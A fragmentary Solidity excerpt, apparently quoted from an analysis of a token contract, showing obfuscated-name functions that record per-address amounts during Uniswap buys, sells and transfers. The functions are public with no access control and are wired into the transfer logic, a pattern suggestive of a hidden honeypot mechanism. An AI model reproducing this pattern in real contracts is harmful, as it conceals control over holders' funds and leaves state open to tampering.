...
interface IUserAmountChange{
    function cooterAmount(address account, uint256 amount) external;
    function cooTrAmount(address account, uint256 amount) external;
}
...
contract UserAmountChange is IUserAmountChange{
    ...
    function cooterAmount(address account, uint256 amount) public {
        outAmount[account] = outAmount[account].add(amount);
    }
    function cooTrAmount(address account, uint256 amount) public {
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                hesrzhange.cooTrAmount(to, amount);
            }else if(to == uniswapV2Pair){
				hesrzhange.cooterAmount(from, amount);
            }else{
                hesrzhange.cooterAmount(from, amount);
                takeFee = false;
            }
